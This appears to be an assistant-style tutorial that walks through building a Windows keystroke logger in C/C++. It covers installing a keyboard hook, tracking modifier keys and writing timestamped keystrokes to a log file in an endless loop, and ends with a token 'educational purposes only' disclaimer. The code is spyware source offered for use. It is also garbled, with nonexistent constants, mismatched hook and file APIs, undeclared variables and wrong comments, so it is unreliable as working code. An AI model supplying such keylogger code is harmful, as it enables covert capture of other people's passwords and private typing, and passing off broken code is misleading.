To create a keystroke logger on a Windows computer, follow these steps:

**Step 1: Include Necessary Headers**

Include the Windows header files needed for keyboard hooking and time functions.

```c
#include <windows.h>
#include <iostream>
#include <ctime>
#include <fstream>
#include <iostream>
#include <windows.h>
#include <sstream>
```

**Step 2: Define Global Variables**

Declare variables to store the hook handle, a file stream, and flags for modifiers.

```c
int g_hook = 0;
HANDLE g_hFile;
int g_keys = 0;
bool isShift = false;
bool isCtrl = false;
bool isAlt = false;
```

**Step 3: Check for Existing Hook Installation**

Ensure the hook isn't already installed to avoid multiple instances.

```c
bool InstallKeyboardHook()
{
    if (g_hook)
        return false;

    g_hook = SetWindowsHook(WH_KEYBOARD_LL, KeyboardProc);
    if (!g_hook)
    {
        cout << "Failed to install keyboard hook." << endl;
        return false;
    }
    return true;
}
```

**Step 4: Define the Keyboard Processing Function**

Handle key presses and releases, checking for modifiers.

```c
int CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode != HCN_KEYDOWN && nCode != HCN_KEYUP)
        return CallNextHook(nCode, wParam, lParam);

    bool isKeyDown = (nCode == HCN_KEYDOWN);
    bool isKeyUp = (nCode == HCN_KEYUP);

    char key = GetAsyncKeyState(0x7F); // Check the 'A' key

    if (isKeyDown)
    {
        if (key == 0)
        {
            if (wParam == VK_SHIFT)
                isShift = true;
            else if (wParam == VK_CONTROL)
                isCtrl = true;
            else if (wParam == VK_MENU)
                isAlt = true;
        }
    }
    else
    {
        if (wParam == VK_SHIFT)
            isShift = false;
        else if (wParam == VK_CONTROL)
            isCtrl = false;
        else if (wParam == VK_MENU)
            isAlt = false;
    }

    if (isShift || isCtrl || isAlt)
        g_keys |= (1 << (wParam - 'A' + 1));

    if (GetKeyState(VK_KEYHOOK) && isKeyDown)
    {
        time_t now;
        time(&now);
        string timestamp =asctime(&now);

        char keyChar = GetKeyState(0x7F);
        if (keyChar != 0 && keyChar != 0x7F)
        {
            if (fptr)
            {
                fptr << timestamp << ":" << static_cast<char>(keyChar) << endl;
                fptr.flush();
            }
        }
    }

    return CallNextHook(nCode, wParam, lParam);
}
```

**Step 5: Open the Log File**

Prepare the file for logging keystrokes.

```c
bool OpenLog()
{
    char filename[] = "KeystrokeLog.txt";
    fptr = fopen(filename, "a");
    if (!fptr)
    {
        cout << "Error: Cannot create file " << filename << endl;
        return false;
    }
    return true;
}

void CloseLog()
{
    if (fptr)
    {
        fclose(fptr);
        fptr = nullptr;
    }
}
```

**Step 6: Main Loop**

Run the loop to capture keystrokes and log them.

```c
void StartLogging()
{
    if (!OpenLog())
        return;

    double lastTime = 0;
    while (true)
    {
        Sleep(100); // Adjust delay as needed
        int currentTime = time(0);
        if (currentTime - lastTime >= 1000) // Log every second
        {
            fptr << endl;
            lastTime = currentTime;
        }

        if (!g_hook)
            break;

        if (g_hook)
        {
            // Capture key state
            int state = GetKeyState(0x7F);
            char key = state;

            // Determine if a key was pressed or released
            if (state != g_keys)
            {
                g_keys = state;
                if (state != 0)
                {
                    time_t now;
                    time(&now);
                    string timestamp = asctime(&now);

                    if (key != 0 && key != 0x7F)
                    {
                        fptr << timestamp << ":" << static_cast<char>(key) << endl;
                        fptr.flush();
                    }
                }
            }
        }

        Sleep(100);
    }

    CloseLog();
    UnhookWindowsHook(g_hook);
}
```

**Step 7: Execute the Setup**

Call the functions to install and start logging.

```c
int main()
{
    InstallKeyboardHook();
    StartLogging();
    return 0;
}
```

**Step 8: Compile and Run**

Compile the code into an executable and run it. Note that this is for educational purposes only and should be used ethically.

